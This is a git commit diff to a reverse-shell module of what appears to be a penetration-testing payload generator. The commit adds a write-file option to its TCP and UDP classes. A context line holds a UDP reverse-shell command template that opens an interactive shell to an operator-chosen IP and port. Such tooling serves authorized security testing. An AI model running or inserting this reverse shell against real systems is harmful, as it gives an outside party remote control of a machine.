612c4eec486631728fdbd288054d1b3459d00371
Nong Hoang Tu <dmknght@parrotsec.org>
2021-02-12 00:24:38 +0700

    Add write file option

--- shellgen/modules/linux/shell.py
+++ shellgen/modules/linux/shell.py
@@ -10,6 +10,7 @@ class ReverseTCP(plugin.ReverseShell):
             choices=const.LINUX_SHELL,
             help="Select shell type on target machine"
         )
+        self.set_write_file()
         self.opts.description = "[ReverseShell][TCP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
 
@@ -29,6 +30,7 @@ class ReverseUDP(plugin.ReverseShell):
         self.is_udp = True
         self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
+        self.set_write_file()
 
     def make_shell(self):
         self.shell = f"{self.args.shell} -i >& /dev/udp/{self.args.ip}/{self.args.port} 0>&1"
